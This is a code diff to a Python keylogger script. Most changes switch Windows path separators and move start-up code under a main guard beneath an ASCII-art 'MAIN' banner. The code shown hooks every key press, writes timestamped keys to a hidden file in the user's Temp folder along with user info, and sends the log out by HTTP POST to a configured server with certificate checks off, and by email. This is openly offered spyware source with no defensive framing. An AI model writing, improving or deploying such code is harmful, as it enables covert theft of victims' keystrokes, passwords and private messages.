@@ -13,7 +13,7 @@ import urllib3
 
 # VARIABLES
 
-##############################################################################################
+##########################################################################################
 
 # removes the future warning
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -37,12 +37,12 @@ password = ""
 user_name = psutil.users()[0].name
 
 # stores the path chosen to save the keylogger.txt file
-path_to_store = rf"C:\Users\{user_name}\AppData\Local\Temp\Scriptz"
+path_to_store = f"C:/Users/{user_name}/AppData/Local/Temp/Scriptz"
 
 
 # FUNCTIONS
 
-##############################################################################################
+##########################################################################################
 
 # function to get some info about the user
 def get_user_info():
@@ -67,10 +67,9 @@ def send_data_to_server():
     global server_url
     global user_name
 
-    file = { f"keylogger.txt" : open(f"{path_to_store}\keylogger_{user_name}.txt", "rb") }
+    file = { f"keylogger.txt" : open(f"{path_to_store}/keylogger_{user_name}.txt", "rb") }
 
     req = requests.post(url= server_url, files= file, verify= False)
-
     #print(req.status_code)
 
 
@@ -88,7 +87,7 @@ def send_data_to_email():
     message["From"] = f"Keylogger <{email}>"
     message["To"] = email
 
-    text = open(f"{path_to_store}\keylogger_{user_name}.txt", "r")
+    text = open(f"{path_to_store}/keylogger_{user_name}.txt", "r")
     body = MIMEText(text.read(), "plain")
     text.close()
 
@@ -123,7 +122,7 @@ def save_file():
     
     # code for saving pressed keys into keylogger file
     if (text != ""):
-        file = open(f"{path_to_store}\keylogger_{user_name}.txt", "a")
+        file = open(f"{path_to_store}/keylogger_{user_name}.txt", "a")
         file.write(text)
         file.close()
 
@@ -154,23 +153,34 @@ def save_file():
     timer.start()
 
 
-# checks if (the path chosen to save the keylogger.txt) exists if not creates it
-if (os.path.isfile(f"{path_to_store}\keylogger_{user_name}.txt") == False):
-    os.mkdir(path_to_store)
-    file = open(f"{path_to_store}\keylogger_{user_name}.txt", "a")
-    file.write(get_user_info().__str__()+"\n\n")
-    file.close()
-
-
-# call save_file to execute internal code and start a NEW THREAD
-save_file()
-
 # function that listens key pressed by user
 def on_key_press(event):  
 
     global text
-    text += f"{datetime.now()}: '{event.name}' \n"
-    
-    
-# create an events for key pressed
-keyboard.on_press(on_key_press)
+    text += f"{datetime.now()} : '{event.name}' \n"
+
+
+
+#####         #####         ######         ###   #####      ###
+######       ######        ###  ###        ###   ######     ###
+###  ##     ##  ###       ###    ###       ###   ###  ##    ###
+###   ##   ##   ###      ###      ###      ###   ###   ##   ###
+###    ## ##    ###     ### ###### ###     ###   ###    ##  ###
+###     ###     ###    ###          ###    ###   ###     ## ### 
+###             ###   ###            ###   ###   ###      #####
+
+if __name__ == "__main__":
+
+    # checks if (the path chosen to save the keylogger.txt) exists if not creates it
+    if (os.path.isfile(f"{path_to_store}/keylogger_{user_name}.txt") == False):
+        os.mkdir(path_to_store)
+        file = open(f"{path_to_store}/keylogger_{user_name}.txt", "a")
+        file.write(get_user_info().__str__()+"\n\n")
+        file.close()
+
+
+    # call save_file to execute internal code and start a NEW THREAD
+    save_file()
+
+    # create an events for key pressed
+    keyboard.on_press(on_key_press)
